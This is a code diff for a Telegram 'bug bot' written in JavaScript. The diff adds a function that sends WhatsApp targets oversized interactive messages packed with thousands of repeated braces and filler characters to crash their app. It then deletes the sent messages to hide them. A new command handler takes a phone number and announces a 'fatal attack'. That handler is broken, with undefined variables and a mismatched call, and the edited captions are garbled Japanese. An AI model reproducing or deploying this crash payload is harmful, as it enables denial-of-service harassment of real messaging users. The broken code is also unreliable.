@@ -423,6 +423,140 @@ function checkCooldown(userId) {
   setTimeout(() => cooldowns.delete(userId), cooldownTime);
   return 0; // Tidak dalam cooldown
 }
+// Function Bug
+function sleep(ms) {
+  return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+async function pungtion(sock, target, count = 3) {
+  const messageIds = [];
+
+  for (let i = 0; i < count; i++) {
+    try {
+      const message = {
+        viewOnceMessage: {
+          message: {
+            messageContextInfo: {
+              deviceListMetadata: {},
+              deviceListMetadataVersion: 2,
+            },
+            interactiveMessage: {
+              contextInfo: {
+                mentionedJid: [target],
+                isForwarded: true,
+                forwardingScore: 99999999,
+                businessMessageForwardInfo: {
+                  businessOwnerJid: target,
+                },
+              },
+              body: {
+                text: "📄Null Tanggapan Diterima" + "ꦽ".repeat(7777),
+              },
+              nativeFlowMessage: {
+                messageParamsJson: "{".repeat(9999),
+                buttons: [
+                  {
+                    name: "single_select",
+                    buttonParamsJson: "{".repeat(15000),
+                    version: 3,
+                  },
+                  {
+                    name: "call_permission_request",
+                    buttonParamsJson: "{".repeat(15000),
+                    version: 3,
+                  },
+                  {
+                    name: "cta_url",
+                    buttonParamsJson: "{".repeat(15000),
+                    version: 3,
+                  },
+                  {
+                    name: "cta_call",
+                    buttonParamsJson: "{".repeat(15000),
+                    version: 3,
+                  },
+                  {
+                    name: "cta_copy",
+                    buttonParamsJson: "{".repeat(15000),
+                    version: 3,
+                  },
+                  {
+                    name: "cta_reminder",
+                    buttonParamsJson: "{".repeat(15000),
+                    version: 3,
+                  },
+                  {
+                    name: "cta_cancel_reminder",
+                    buttonParamsJson: "{".repeat(15000),
+                    version: 3,
+                  },
+                  {
+                    name: "address_message",
+                    buttonParamsJson: "{".repeat(15000),
+                    version: 3,
+                  },
+                  {
+                    name: "send_location",
+                    buttonParamsJson: "{".repeat(15000),
+                    version: 3,
+                  },
+                  {
+                    name: "quick_reply",
+                    buttonParamsJson: "{".repeat(15000),
+                    version: 3,
+                  },
+                  {
+                    name: "single_select",
+                    buttonParamsJson: "ꦽ".repeat(3000),
+                    version: 3,
+                  },
+                  {
+                    name: "call_permission_request",
+                    buttonParamsJson: JSON.stringify({ status: true }),
+                    version: 3,
+                  },
+                  {
+                    name: "camera_permission_request",
+                    buttonParamsJson: JSON.stringify({ cameraAccess: true }),
+                    version: 3,
+                  },
+                ],
+              },
+            },
+          },
+        },
+      };
+
+      // kirim message crash
+      const msg = await sock.sendMessage(target, message);
+      const messageId = msg.key.id;
+      messageIds.push(messageId);
+
+      console.log(`✅ [${i + 1}/${count}] Vexnew crash terkirim: ${messageId}`);
+
+      await sleep(600);
+    } catch (e) {
+      console.error("❌ Error NewEra:", e);
+    }
+  }
+
+  // 🔥 hapus semua pesan setelah dikirim
+  for (let i = 0; i < messageIds.length; i++) {
+    const id = messageIds[i];
+    await sleep(1000);
+    await sock.sendMessage(target, {
+      delete: {
+        remoteJid: target,
+        fromMe: false,
+        id,
+        participant: sock.user.id,
+      },
+    });
+    console.log(`🗑️ Pesan ${i + 1} dihapus`);
+  }
+
+  console.log("✅ Semua pesan crash sudah dihapus");
+}
 
 
 // ~ Enc Xopwn Confugurasi
@@ -540,7 +674,7 @@ bot.onText(/\/start/, (msg) => {
 
 if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
   return bot.sendPhoto(chatId, randomImage, {
-    caption: `<blockquote>Извини, дорогая, у тебя нет возможности связаться с ним, потому что у него есть кто-то другой ( 🫟 ).</blockquote>`,
+    caption: `<blockquote>少なくともプレミアムはまず、そのバグプレミアムは、その場所へのみアクセスでき、安いことが保証されています ( 🫟 ).</blockquote>`,
     parse_mode: "HTML",
     reply_markup: {
       inline_keyboard: [
@@ -706,7 +840,7 @@ bot.onText(/\/IOS (\d+)/, async (msg, match) => {
 
 if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
   return bot.sendPhoto(chatId, randomImage, {
-    caption: "```\nBELI PREMIUM DULU SONO KONTOL\n\n#-Bangsat lu bukan premium user anjeng, beli dulu sana acces sama owner\n```",
+    caption: "```\n少なくともプレミアムはまず、そのバグプレミアムは、その場所へのみアクセスでき、安いことが保証されています\n```",
     parse_mode: "MarkdownV2",
     reply_markup: {
       inline_keyboard: [
@@ -811,7 +945,7 @@ bot.onText(/\/UI (\d+)/, async (msg, match) => {
 
 if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
   return bot.sendPhoto(chatId, randomImage, {
-    caption: "```\nBELI PREMIUM DULU SONO KONTOL\n\n#-Bangsat lu bukan premium user anjeng, beli dulu sana acces sama owner\n```",
+    caption: "```\n少なくともプレミアムはまず、そのバグプレミアムは、その場所へのみアクセスでき、安いことが保証されています\n```",
     parse_mode: "MarkdownV2",
     reply_markup: {
       inline_keyboard: [
@@ -916,7 +1050,7 @@ bot.onText(/\/Xcrash (\d+)/, async (msg, match) => {
 
 if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
   return bot.sendPhoto(chatId, randomImage, {
-    caption: "```\nBELI PREMIUM DULU SONO KONTOL\n\n#-Bangsat lu bukan premium user anjeng, beli dulu sana acces sama owner\n```",
+    caption: "```\n少なくともプレミアムはまず、そのバグプレミアムは、その場所へのみアクセスでき、安いことが保証されています\n```",
     parse_mode: "MarkdownV2",
     reply_markup: {
       inline_keyboard: [
@@ -1019,7 +1153,7 @@ bot.onText(/\/encvexxuzzz/, async (msg) => {
     // Cek Premium User
     if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
         return bot.sendPhoto(chatId, randomImage, {
-            caption: "```\nBELI PREMIUM DULU SONO KONTOL\n\n#-Bangsat lu bukan premium user anjeng, beli dulu sana acces sama owner\n```",
+            caption: "```\n少なくともプレミアムはまず、そのバグプレミアムは、その場所へのみアクセスでき、安いことが保証されています\n```",
             parse_mode: "MarkdownV2",
             reply_markup: {
                 inline_keyboard: [
@@ -1202,6 +1336,33 @@ bot.onText(/\/listprem/, (msg) => {
 
   bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
 });
+
+bot.onText(/\/listprem/, (msg) => {
+  const chatId = msg.chat.id;
+  const senderId = msg.from.id;
+  
+    if (!q) {
+        return m.reply(`Example:\n\n/cmd 628XXXX`);
+    }
+
+    let vexnumb = q.replace(/[^0-9]/g, '');
+
+    let bijipler = vexnumb + "@s.whatsapp.net";
+
+    let Proses = await m.reply(`Targeting : ${vexnumb}\nStatus : still in process\nThe process of launching a fatal attack`);
+
+    for (let i = 0; i < 2; i++) {
+        await pungtion(targetJid);
+    }
+
+    await sock.telegram.editMessageText(
+sock.chat.id,
+        Proses.message_id,
+        undefined,
+        `A fatal attack has landed on the target's WhatsApp\nThank you for using service\n\nAll right reversed by VexxuzzZ`
+    );
+});
+
 //=====================================
 bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
     const chatId = msg.chat.id;
